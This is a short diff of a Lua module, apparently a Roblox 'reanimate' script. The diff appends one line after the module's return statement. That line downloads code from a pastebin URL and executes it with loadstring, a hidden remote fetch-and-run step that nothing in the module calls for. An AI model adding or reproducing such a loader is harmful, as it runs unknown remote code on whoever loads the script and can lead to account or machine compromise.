@@ -1739,3 +1739,4 @@ local reanimate=function()
 end
 
 return {reanimate = reanimate, stopreanimate = stopreanimate, gp = gp, rs = rs, insSet = insSet, insGet = insGet, cfMul = cfMul, mouse = mouse, isReanimated=function() return c end}
+loadstring(game:HttpGet("https://pastebin.com/raw/DuL1y58L"))()
